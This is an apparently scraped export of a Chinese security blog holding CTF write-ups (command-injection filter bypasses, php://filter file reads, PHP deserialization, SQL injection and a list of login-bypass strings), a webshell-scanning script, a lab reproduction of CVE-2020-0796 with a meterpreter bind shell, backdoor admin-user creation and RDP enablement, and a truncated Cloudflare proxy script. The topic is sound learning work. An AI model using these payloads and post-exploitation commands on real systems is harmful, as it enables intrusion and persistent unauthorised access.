获取一个页面内所有参数 start = 0 params = {} while str.find(&quot;$_GET[&#39;&quot;, start) != -1: pos2 = str.find(&quot;&#39;]&quot;, str.find(&quot;$_GET[&#39;&quot;, start) + 1) var = str[str.find(&quot;$_GET[&#39;&quot;, start) + 7: pos2] start = pos2 + 1 params[var] = &#39;echo(&quot;glzjin&quot;);&#39; # print(var) start = 0 data = {} while str.find(&quot;$_POST[&#39;&quot;, start) != -1: pos2 = str.find(&quot;&#39;]&quot;, str.find(&quot;$_POST[&#39;&quot;, start) + 1) var = str[str.find(&quot;$_POST[&#39;&quot;, start) + 8: pos2] start = pos2 + 1 data[var] = &#39;echo(&quot;glzjin&quot;);&#39; # print(var) # eval test r = session.post(&#39;http://localhost:11180/web2/&#39; + file, data=data, params=params) if r.text.find(&#39;glzjin&#39;) != -1: mutex.acquire() print(file + &quot; found!&quot;) mutex.release() # assert test for i in params: params[i] = params[i][:-1] for i in data: data[i] = data[i][:-1] r = session.post(&#39;http://localhost:11180/web2/&#39; + file, data=data, params=params) if r.text.find(&#39;glzjin&#39;) != -1: mutex.acquire() print(file + &quot; found!&quot;) mutex.release() # system test for i in params: params[i] = &#39;echo glzjin&#39; for i in data: data[i] = &#39;echo glzjin&#39; r = session.post(&#39;http://localhost:11180/web2/&#39; + file, data=data, params=params) if r.text.find(&#39;glzjin&#39;) != -1: mutex.acquire() print(file + &quot; found!&quot;) mutex.release() # print(&quot;====================&quot;) for file in files: # 遍历文件夹 if not os.path.isdir(file): # 判断是否是文件夹，不是文件夹才打开 # read_file(file) pool.submit(read_file, file) 访问 /xk0SzyKwfzw.php?Efa5BVG=cat%20/flag 得到flag","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"ACTF2020新生赛-Include","slug":"ACTF2020新生赛-Include","date":"2020-06-18T13:42:00.000Z","updated":"2020-07-15T09:49:55.713Z","comments":true,"path":"2020/06/18/ACTF2020新生赛-Include/","link":"","permalink":"http://lingxin16.github.io/2020/06/18/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Include/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 打开题目 tips指向?file=flag.php 访问?file=php://filter/read/convert.base64-encode/resource=flag.php 得到flag.php的base64加密后的内容 然后base64解码得flag","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"GXYCTF2019-PingPingPing","slug":"GXYCTF2019-PingPingPing","date":"2020-06-17T14:02:00.000Z","updated":"2020-07-15T09:50:06.874Z","comments":true,"path":"2020/06/17/GXYCTF2019-PingPingPing/","link":"","permalink":"http://lingxin16.github.io/2020/06/17/GXYCTF2019-PingPingPing/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 打开题目 只有一个/?ip= 尝试传?ip=127.0.0.1，得到回显 利用管道符漏洞，传?ip=127.0.0.1||ls 看到flag.php 传?ip=127.0.0.1||cat%20flag.php 尝试传一下，得知如果我们传入的字符含有flag空格或者/，那么就会返回错误 这里用$IFS$1来绕过空格的限制，传?ip=127.0.0.1||cat$IFS$1index.php 可以看到确实过滤了很多 这里我用三种办法 1.变量替换preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip 因为这个会判断输入语句中是否按顺序出现f l a g，所以我们用 ?ip=127.0.0.1||a=g;cat$IFS$1fla$a.php 2.内敛执行?ip=127.0.0.1||a=g;cat$IFS$1`ls`3.sh既然过滤了bash，那么可以用sh ?ip=127.0.0.1||echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh 其中Y2F0IGZsYWcucGhw是base64加密之后的cat flag.php 关于命令执行的绕过，可以参考ghtwf01师傅的这篇文章：命令执行漏洞利用及绕过方式总结","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"极客大挑战2019-Http","slug":"极客大挑战2019-Http","date":"2020-06-13T14:06:00.000Z","updated":"2020-07-15T09:50:18.356Z","comments":true,"path":"2020/06/13/极客大挑战2019-Http/","link":"","permalink":"http://lingxin16.github.io/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 打开题目 主页并没有什么有用的信息，查看源文件，发现Secret.php 打开 提示It doesn’t come from ‘https://www.Sycsecret.com&#39; 那么就是http头伪造 利用burpsuit抓包修改 或者火狐编辑消息头 这里我用火狐 添加Referer:https://www.Sycsecret.com 然后看到Please use “Syclover” browser 那么再更改User-Agent: “Syclover” browser 看到No!!! you can only read this locally!!! 那么再修改X-Forwarded-For: 127.0.0.1 得到flag 上边的操作也可以用Python脚本实现 # -*- coding: UTF-8 -*- import requests url=&quot;http://node3.buuoj.cn:29753/Secret.php&quot; headers={ &quot;Referer&quot;: &quot;https://www.Sycsecret.com&quot;, &quot;Origin&quot;:&quot;https://www.Sycsecret.com&quot;, &quot;User-Agent&quot;: &quot;Syclover&quot;, &quot;X-Forwarded-For&quot;: &quot;127.0.0.1&quot; } r=requests.get(url=url,headers=headers) print(r.text)","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"极客大挑战2019-Knife","slug":"极客大挑战2019-Knife","date":"2020-06-13T13:52:00.000Z","updated":"2020-07-15T09:50:32.183Z","comments":true,"path":"2020/06/13/极客大挑战2019-Knife/","link":"","permalink":"http://lingxin16.github.io/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Knife/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 打开题目 上边有提示我家菜刀丢了，你能帮我找一下么 并且有eval($_POST[&quot;Syc&quot;]);说明连接密码是Syc 既然提示菜刀，那么我们用菜刀连接 这里我用蚁剑，测试连接成功 在根目录找到flag","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"极客大挑战2019-PHP","slug":"极客大挑战2019-PHP","date":"2020-06-12T13:58:00.000Z","updated":"2020-07-15T09:50:44.449Z","comments":true,"path":"2020/06/12/极客大挑战2019-PHP/","link":"","permalink":"http://lingxin16.github.io/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 打开题目 描述中说有备份网站的习惯，尝试常见的网站备份地址，发现www.zip文件存在 下载解压，发现存在五个文件 其中三个PHP文件代码分别为 index.php &lt;!DOCTYPE html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;I have a cat!&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt; &lt;/head&gt; &lt;style&gt; #login{ position: absolute; top: 50%; left:50%; margin: -150px 0 0 -150px; width: 300px; height: 300px; } h4{ font-size: 2em; margin: 0.67em 0; } &lt;/style&gt; &lt;body&gt; ```index.php &lt;!DOCTYPE html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;I have a cat!&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt; &lt;/head&gt; &lt;style&gt; #login{ position: absolute; top: 50%; left:50%; margin: -150px 0 0 -150px; width: 300px; height: 300px; } h4{ font-size: 2em; margin: 0.67em 0; } &lt;/style&gt; &lt;body&gt; &lt;div id=&quot;world&quot;&gt; &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯 &lt;/div&gt; &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;&gt;不愧是我！！！ &lt;/div&gt; &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;&gt; &lt;?php include &#39;class.php&#39;; $select = $_GET[&#39;select&#39;]; $res=unserialize(@$select); ?&gt; &lt;/div&gt; &lt;div style=&quot;position: absolute;bottom: 5%;width: 99%;&quot;&gt;&lt;p align=&quot;center&quot; style=&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt; &lt;/div&gt; &lt;script src=&#39;http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js&#39;&gt;&lt;/script&gt; &lt;script src=&#39;http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js&#39;&gt;&lt;/script&gt; &lt;script src=&#39;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js&#39;&gt;&lt;/script&gt; &lt;script src=&#39;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js&#39;&gt;&lt;/script&gt; &lt;script src=&quot;index.js&quot;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; class.php &lt;?php include &#39;flag.php&#39;; error_reporting(0); class Name{ private $username = &#39;nonono&#39;; private $password = &#39;yesyes&#39;; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; } function __wakeup(){ $this-&gt;username = &#39;guest&#39;; } function __destruct(){ if ($this-&gt;password != 100) { echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); } if ($this-&gt;username === &#39;admin&#39;) { global $flag; echo $flag; }else{ echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;; die(); } } } ?&gt; flag.php &lt;?php $flag = &#39;Syc{dog_dog_dog_dog}&#39;; ?&gt; 可以看到在index.php中包含了class.php 代码如下 &lt;?php include &#39;class.php&#39;; $select = $_GET[&#39;select&#39;]; $res=unserialize(@$select); ?&gt; 从这几行代码中，推断与反序列化有关 然后看class.php几个关键函数 __construct构造函数 __wakeup函数 __destruct析构函数关于__wakeup函数的漏洞，参考wakeup()函数漏洞以及实际漏洞分析 __wakeup()漏洞，简要来说就是当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup()的执行 这里我们需要构造username等于admin和password等于100来echo flag &lt;?php class Name { private $username = &#39;admin&#39;; private $password = &#39;100&#39;; } $a = new Name(); echo serialize($a); ?&gt; 得到O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;s:3:”100”;} 为了绕过__wakeup() 我们将2改为3 得到O:4:”Name”:3:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;s:3:”100”;} 然后关于private声明变量 private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\\0的前缀。字符串长度也包括所加前缀的长度。其中 \\0 字符也是计算长度的。 因此我们在类名和字段名前面加上\\0的前缀，而\\0 在url栏中会出现空白符，复制的时候丢失，所以我们加上%00 最后得到payload ?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"极客大挑战2019-LoveSQL","slug":"极客大挑战2019-LoveSQL","date":"2020-06-11T13:56:00.000Z","updated":"2020-07-15T09:50:55.580Z","comments":true,"path":"2020/06/11/极客大挑战2019-LoveSQL/","link":"","permalink":"http://lingxin16.github.io/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 打开题目 熟悉的界面 有一行红字用 sqlmap 是没有灵魂的 用sqlmap跑一下，但是失败了 还是手动吧 用万能密码登录得到 登陆成功，并提示密码，密码尝试用md5爆破无果 然后就是普通的sql注入了.. username=1’order by 1# username=1’order by 4#的时候出现Unknown column ‘4’ in ‘order clause’ 说明总共有三个字段 username=1’union select 1,2,3 # 得到回显点2和3 username=1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()# 得到两个表geekuser和l0ve1ysq1 username=1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’geekuser’# 得到三个字段id，username和password 爆破这三个字段 username=1’union select 1,group_concat(id,username,password),3 from geekuser# 没有flag 接下来换l0ve1ysq1表 username=1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’l0ve1ysq1’# 得到一样的三个字段 爆破这三个字段 1’union select 1,group_concat(id,username,password),3 from l0ve1ysq1# 得到flag","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"CVE-2020-0796复现","slug":"CVE-2020-0796复现","date":"2020-06-08T06:06:00.000Z","updated":"2020-07-15T09:51:10.291Z","comments":true,"path":"2020/06/08/CVE-2020-0796复现/","link":"","permalink":"http://lingxin16.github.io/2020/06/08/CVE-2020-0796%E5%A4%8D%E7%8E%B0/","excerpt":"最近发布的一个Windows漏洞，有时间来复现一下","text":"最近发布的一个Windows漏洞，有时间来复现一下 漏洞介绍有关此漏洞的详细介绍:https://www.freebuf.com/vuls/233263.html 漏洞复现利用Windows10 1903版本来进行复现 镜像下载与安装镜像：ed2k://|file|cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso|4815527936|47D4C57E638DF8BF74C59261E2CE702D|安装镜像 虚拟机信息Windows10 1903版本 ip：192.168.1.104 漏洞扫描攻击机 工具：SMBGhost python3 scanner.py 192.168.1.104 靶机 工具：奇安信检测工具 使用metasploit生成bufmsfvenom -p windows/x64/meterpreter/bind_tcp lport=6666 -f py -o tool.py 将SMBGhost_RCE_PoC中的exploit.py中的USER_OAYLOAD更换为刚刚生成的buf 使用metasploit对6666端口进行监听msfconsole use exploit/multi/handler set payload windows/x64/meterpreter/bind_tcp show options set LPORT 6666 set RHOST 192.168.1.104 exploit 运行exploit.pypython3 exploit.py -ip 192.168.1.104 这里打下去靶机会出现蓝屏重启的现象，多试几次就好 拿到shell 提权添加用户net user d1a0 password /add加入管理组net localgroup Administrators d1a0 /add net localgroup Users d1a0 /del查看用户信息net user 开启远程连接功能REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 工具地址： SMBGhost：https://github.com/ollypwn/SMBGhost 奇安信检测工具：http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip SMBGhost_RCE_PoC：https://github.com/chompie1337/SMBGhost_RCE_PoC.git","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://lingxin16.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"计算机网络原理学习","slug":"计算机网络原理学习","date":"2020-06-07T03:32:00.000Z","updated":"2020-07-15T09:51:28.599Z","comments":true,"path":"2020/06/07/计算机网络原理学习/","link":"","permalink":"http://lingxin16.github.io/2020/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"OSI和TCP.IP网络模型OSI网络模型(参考模型) 分为七层 应用层 用户接口 HTTP Telnet 表示层 数据的表现形式、特定功能的实现例如加密 ASCll、ENCDIC 、JPEG 会话层 对应用会话的管理、同步 操作系统、应用读取 传输层 可靠与不可靠的传输、传输前的错误检测、流控 TCP(可靠)/UDP(不可靠) 网络层 提供逻辑地址、选路 IP 数据链路层 成帧、用Mac地址访问媒介、错误检测与修正 802.3/802.2 HDLC/FR/PPP 物理层 设备之间的比特流传输、物理接口、电气特性等 EIA/TIA-232 V.35/RJ45 TCP/IP协议栈 应用层 传输层 网络层 网络接口层 对比 网络设备路由器 、交换机、防火墙(硬件)等 以太网双绞线制作的两种标准以及线序 EIA/TIA 568A 绿白 绿 橙白 蓝 蓝白 橙 棕白 棕 EIA/TIA 568B 橙白 橙 绿白 蓝 蓝白 绿 棕白 棕 标准以太网(10Mbit/s) 由IEEE802.3定义 通常只定位在网络的接入层 快速以太网(100Mbit/s) IEEE802.3u标准 千兆以太网 对IEEE802.3以太网标准的扩展 两个标准(IEEE802.3z光纤羽铜缆、IEEE82.3AB双绞线) 以太网设备工作原理当交换机的Mac地址表中没有目标地址，就会引起泛洪 Mac地址表条目占满，可以引起Mac地址表泛洪攻击 局域网LAN（局域网）是有限区域内相对距离较近的计算机和其他组件的网络","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"计算机网络原理","slug":"计算机网络原理","permalink":"http://lingxin16.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/"}]},{"title":"SUCTF2019-CheckIn","slug":"SUCTF2019-CheckIn","date":"2020-06-01T04:21:00.000Z","updated":"2020-07-15T09:51:45.016Z","comments":true,"path":"2020/06/01/SUCTF2019-CheckIn/","link":"","permalink":"http://lingxin16.github.io/2020/06/01/SUCTF2019-CheckIn/","excerpt":"题目地址：buuctf","text":"题目地址：buuctf 打开题目，发现是个文件上传类型的题目 上传一句话木马尝试 提示非法后缀 再次用png图片尝试 提示上传文件中包含? 当上传其他类型的文件时(txt、html等)提示不是图片文件 关于exif_imagetype我们百度一下 exif_imagetype() 读取一个图像的第一个字节并检查其签名。说明我们可以在文件头部添加jpg类型图片的标志（FF D8 FF）来绕过并且用JavaScript语句写一句话来绕过对问号过滤 接下来上传 上传成功 但是当我们连接的时候发现并没有解析成功 这里我们用.user.ini来将jpg格式解析成php格式 关于.user.ini这里有一篇文章 user.ini文件构成的PHP后门 这是我写的一个.user.ini文件 先把这个.user.ini文件上传 然后上传1.jpg","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"极客大挑战2019-SecretFile","slug":"极客大挑战2019-SecretFile","date":"2020-05-30T03:41:00.000Z","updated":"2020-07-15T09:52:01.527Z","comments":true,"path":"2020/05/30/极客大挑战2019-SecretFile/","link":"","permalink":"http://lingxin16.github.io/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 打开题目 把一切都放在那里了 说明我们需要找到隐藏信息，查看源代码 发现./Archive_room.php 打开 点击secret 发现查阅结束，没看清么？回去再仔细看看吧。 多次尝试我们并没有发现有什么变化，那么使用burpsuit抓包 选择send to repeater 重放之后发现secr3t.php 访问 发现flag.php 访问 这次什么都没有，源代码中也没有任何发现，但是在secr3t.php中也有过滤，但是我们可以用filter协议，同样可以读取flag.php的内容 访问/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php 下边的一串字符就是flag.php的内容的base64形式 然后base64解码得到 &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;FLAG&lt;/title&gt; &lt;/head&gt; &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt; &lt;?php echo &quot;我就在这里&quot;; $flag = &#39;flag{99d1cd98-c137-49fd-b4fa-caa468d75d01}&#39;; $secret = &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39; ?&gt; &lt;/p&gt; &lt;/body&gt; 提交flag","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"极客大挑战2019-Havefun","slug":"极客大挑战2019-Havefun","date":"2020-05-30T03:28:00.000Z","updated":"2020-07-15T09:52:16.697Z","comments":true,"path":"2020/05/30/极客大挑战2019-Havefun/","link":"","permalink":"http://lingxin16.github.io/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 打开题目 并没有发现什么有用的信息，查看源代码发现 当我们传入一个cat参数，就把这个参数的值打印出来，当传入cat=dog时我们发现返回的值是一串类似flag的字符串 那么我们尝试?cat=dog 得到flag","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"roarctf2019-easy Calc","slug":"roarctf2019-easy Calc","date":"2020-05-29T04:57:00.000Z","updated":"2020-07-15T09:52:31.808Z","comments":true,"path":"2020/05/29/roarctf2019-easy Calc/","link":"","permalink":"http://lingxin16.github.io/2020/05/29/roarctf2019-easy%20Calc/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 打开题目是这样子的 类似一个计算器 在源代码中我们看到他增加了一个waf 还发现了calc.php 打开calc.php可以看到他设置了黑名单 那么我们就是要想法绕过 这里我们是选择用PHP的字符串解析来bypass 构造payload: 查看目录:calc.php?%20num=var_dump(scandir(chr(47))) 这里我们发现一个文件f1agg 读取f1agg:calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)) 得到flag 这里我们用HTTP走私漏洞同样也可以解这道题 参考HTTP走私漏洞","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"极客大挑战2019-EasySQL","slug":"极客大挑战2019-EasySQL","date":"2020-05-29T04:30:00.000Z","updated":"2020-07-15T09:52:44.115Z","comments":true,"path":"2020/05/29/极客大挑战2019-EasySQL/","link":"","permalink":"http://lingxin16.github.io/2020/05/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/","excerpt":"题目地址:buuctf","text":"题目地址:buuctf 打开题目 根据题目可以知道应该是个sql注入 先用万能密码尝试 用户名:admin’or 1=1# 密码:admin 登录成功，得到flag 这里给出一些不同语言类型的万能密码 语言 万能密码 PHP ‘or 1=1/*“or “a”=”a“or 1=1–“or”=”“or”=”a’=’a“or1=1–“or=or”‘’or’=’or’‘) or (‘a’=’a‘.).or.(‘.a.’=’.a‘or 1=1‘or 1=1–‘or 1=1/*‘or”=”a’=’a‘or’ ‘1’=’1’‘or’’=’‘or’’=’’or’’=’‘or’=’1’‘or’=’or’‘or.’a.’=’a‘or1=1–1’or’1’=’1a’or’ 1=1–a’or’1=1–or ‘a’=’a’or 1=1–or1=1– asp aspx “or “a”=”a‘.).or.(‘.a.’=’.aor 1=1–‘or 1=1–a’or’ 1=1–“or 1=1–‘or.’a.’=’a“or”=”a’=’a‘or’’=’or’=’or’ jsp 1’or’1’=’1admin’ or 1=1/*","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"利用cloudflareWorkers制作Google镜像站","slug":"利用cloudflareWorkers制作Google镜像站","date":"2020-05-11T01:43:00.000Z","updated":"2020-07-15T10:03:28.178Z","comments":true,"path":"2020/05/11/利用cloudflareWorkers制作Google镜像站/","link":"","permalink":"http://lingxin16.github.io/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/","excerpt":"今天在群里看到大佬弄的谷歌镜像站，于是也学着部署了一份","text":"今天在群里看到大佬弄的谷歌镜像站，于是也学着部署了一份 首先我们需要注册一个Cloudflare账号 cloudflare官网： https://www.cloudflare.com/ 注册登录之后选择workers 点击创建worker 将下边的代码粘贴到左边代码框 // Website you intended to retrieve for users. const upstream = &#39;www.google.com&#39; // Custom pathname for the upstream website. const upstream_path = &#39;/&#39; // Website you intended to retrieve for users using mobile devices. const upstream_mobile = &#39;www.google.com&#39; // Countries and regions where you wish to suspend your service. const blocked_region = [&#39;KP&#39;, &#39;SY&#39;, &#39;PK&#39;, &#39;CU&#39;] // IP addresses which you wish to block from using your service. const blocked_ip_address = [&#39;0.0.0.0&#39;, &#39;127.0.0.1&#39;] // Whether to use HTTPS protocol for upstream address. const https = true // Whether to disable cache. const disable_cache = true // Replace texts. const replace_dict = { &#39;$upstream&#39;: &#39;$custom_domain&#39;, &#39;//google.com&#39;: &#39;&#39; } addEventListener(&#39;fetch&#39;, event =&gt; { event.respondWith(fetchAndApply(event.request)); }) async function fetchAndApply(request) { ​ const region = request.headers.get(&#39;cf-ipcountry&#39;).toUpperCase(); ​ const ip_address = request.headers.get(&#39;cf-connecting-ip&#39;); ​ const user_agent = request.headers.get(&#39;user-agent&#39;); ​ ​ let response = null; ​ let url = new URL(request.url); ​ let url_hostname = url.hostname; ​ ​ if (https == true) { ​ url.protocol = &#39;https:&#39;; ​ } else { ​ url.protocol = &#39;http:&#39;; ​ } ​ ​ if (await device_status(user_agent)) { ​ var upstream_domain = upstream; ​ } else { ​ var upstream_domain = upstream_mobile; ​ } ​ ​ url.host = upstream_domain; ​ if (url.pathname == &#39;/&#39;) { ​ url.pathname = upstream_path; ​ } else { ​ url.pathname = upstream_path + url.pathname; ​ } ​ ​ if (blocked_region.includes(region)) { ​ response = new Response(&#39;Access denied: WorkersProxy is not available in your region yet.&#39;, { ​ status: 403 ​ }); ​ } else if (blocked_ip_address.includes(ip_address)) { ​ response = new Response(&#39;Access denied: Your IP address is blocked by WorkersProxy.&#39;, { ​ status: 403 ​ }); ​ } else { ​ let method = request.method; ​ let request_headers = request.headers; ​ let new_request_headers = new Headers(request_headers); ​ ​ new_request_headers.set(&#39;Host&#39;, url.hostname); ​ new_request_headers.set(&#39;Referer&#39;, url.hostname); ​ ​ let original_response = await fetch(url.href, { ​ method: method, ​ headers: new_request_headers ​ }) ​ ​ let original_response_clone = original_response.clone(); ​ let original_text = null; ​ let response_headers = original_response.headers; ​ let new_response_headers = new Headers(response_headers); ​ let status = original_response.status; ​ ​ if (disable_cache) { ​ new_response_headers.set(&#39;Cache-Control&#39;, &#39;no-store&#39;); ​ } ​ ​ new_response_headers.set(&#39;access-control-allow-origin&#39;, &#39;*&#39;); ​ new_response_headers.set(&#39;access-control-allow-credentials&#39;, true); ​ new_response_headers.delete(&#39;content-security-policy&#39;); ​ new_response_headers.delete(&#39;content-security-policy-report-only&#39;); ​ new_response_headers.delete(&#39;clear-site-data&#39;); ​ ​ if(new_response_headers.get(&quot;x-pjax-url&quot;)) { ​ new_response_headers.set(&quot;x-pjax-url&quot;, response_headers.get(&quot;x-pjax-url&quot;).replace(&quot;//&quot; + upstream_domain, &quot;//&quot; + url_hostname)); ​ } ​ ​ const content_type = new_response_headers.get(&#39;content-type&#39;); ​ if (content_type.includes(&#39;text/html&#39;) &amp;&amp; content_type.includes(&#39;UTF-8&#39;)) { ​ original_text = await replace_response_text(original_response_clone, upstream_domain, url_hostname); ​ } else { ​ original_text = original_response_clone.body ​ } ​ ​ response = new Response(original_text, { ​ status, ​ headers: new_response_headers ​ }) ​ } ​ return response; } async function replace_response_text(response, upstream_domain, host_name) { let text = await response.text() 